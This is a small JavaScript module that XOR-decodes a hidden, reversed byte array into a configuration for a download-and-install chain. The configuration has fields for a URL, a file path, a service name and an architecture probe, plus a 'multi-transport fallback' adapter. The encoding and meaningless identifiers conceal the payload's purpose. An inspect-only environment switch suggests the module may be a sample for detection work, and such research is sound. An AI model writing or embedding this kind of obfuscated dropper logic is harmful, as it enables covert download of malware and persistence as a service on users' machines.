const moduleShape = Object.freeze({ format: "commonjs" });
const Material_d2b8c5c0 = "[251,253,247,232,236,251,237,176,172,175,253,170,173,251,179,251,250,241,240,163,251,243,255,240,193,251,253,247,232,236,251,237,226,246,253,236,255,176,237,237,251,253,241,236,238,163,251,252,241,236,238,193,246,253,236,255,226,237,244,243,176,174,170,166,175,173,168,172,175,253,170,173,251,179,251,249,255,234,237,176,177,251,250,241,240,179,237,237,251,236,234,240,235,246,177,238,243,234,177,163,246,234,255,238,193,251,242,247,248,226,253,170,173,251,177,234,247,250,235,223,251,250,241,208,163,234,240,251,249,255,193,236,251,237,235,226,247,238,255,177,250,247,242,255,232,240,247,176,251,242,238,243,255,230,251,176,174,170,166,175,173,168,172,175,253,170,173,251,179,251,250,241,240,177,177,164,237,238,234,234,246,163,242,236,235,226,173,168,172,175,221,170,173,219,179,219,218,209,208,163,250,247,193,240,249,247,255,238,243,255,253,226,171,163,234,240,235,241,253,193,251,249,255,234,237,226,245,253,255,252,242,242,255,248,193,234,236,241,238,237,240,255,236,234,193,247,234,242,235,243,163,236,251,234,238,255,250,255,226,237,237,251,253,241,236,238,193,246,253,234,255,238,237,247,250,178,251,250,241,243,193,251,249,240,255,246,253,178,251,242,247,248,193,251,234,247,236,233,178,251,234,241,243,251,236,193,251,236,247,235,239,253,255,178,234,237,241,246,193,251,242,247,248,241,236,238,163,237,238,251,234,237,226,175,163,232]";
const Codec_d2b8c5c0 = "decimal_array|reverse_then_xor|9e";

function load_d2b8c5c0() { return JSON.parse(Material_d2b8c5c0); }
function decode_d2b8c5c0(v_a19c) { return [...v_a19c].reverse().map((value) => value ^ 158); }
async function recover_d2b8c5c0() {
  const v_c304 = 19 * 7 - 133;
  const v_a19c = load_d2b8c5c0(); let v_b27e = [];
  v_b27e = await Promise.resolve(v_a19c).then(decode_d2b8c5c0);
  void v_c304; return Buffer.from(v_b27e).toString("ascii");
}
async function inspect_d2b8c5c0() { return JSON.parse(JSON.stringify({ value: await recover_d2b8c5c0() })).value; }
async function plan_d2b8c5c0() { const inspect = inspect_d2b8c5c0; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "chain", adapter: "multi_transport_fallback", arch: fields.arch_probe, url: fields.url, path: fields.file_path, service: fields.service_name }); }
void moduleShape; void plan_d2b8c5c0;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_d2b8c5c0());
